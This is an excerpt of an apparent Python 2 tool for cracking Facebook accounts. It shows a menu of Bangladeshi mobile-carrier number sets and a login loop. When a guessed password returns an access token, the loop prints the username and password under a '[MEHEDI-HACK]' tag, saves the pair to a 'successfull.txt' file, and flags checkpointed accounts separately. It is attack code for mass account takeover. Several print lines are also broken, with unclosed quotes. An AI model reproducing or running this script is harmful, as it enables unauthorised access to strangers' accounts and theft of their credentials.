...
logo = '\x1b[1;97m--------------------------------------------------\n      ---> Create to by -> Mohammad SHiblu MIM  <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Facebook -> https://www.facebook.com/Nazrul.Hossain.rana009 \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> Facebook  -> https://www.facebook.com/JANNAT.VAU.009 <--- \n\x1b[1;97m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : MOHAMMAD MEHEDI TANIA
    print '\033[1;93mFACEBOOK : MOHAMMAD MEHEDI HASAN
    print '\x1b[1;91mFACEBOOK  : MEHEDI HASAN EMON
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    print
    print '\x1b[1;92m[1]  GP (MEHEDI PRO)'
    print '\x1b[1;92m[2]  AIRTEL(TANIA)'
    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
    print '\x1b[1;92m[4]  BANGLALINK(NEW)'
    print '\x1b[1;92m[5]  GRAMEEN(ITZ,TANIA)'
    print '\x1b[1;92m[6]  TELETALK(ITZ MEHEDI)'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[MEHEDI-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[TANIA-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 10 Days]\x1b[0m \n'
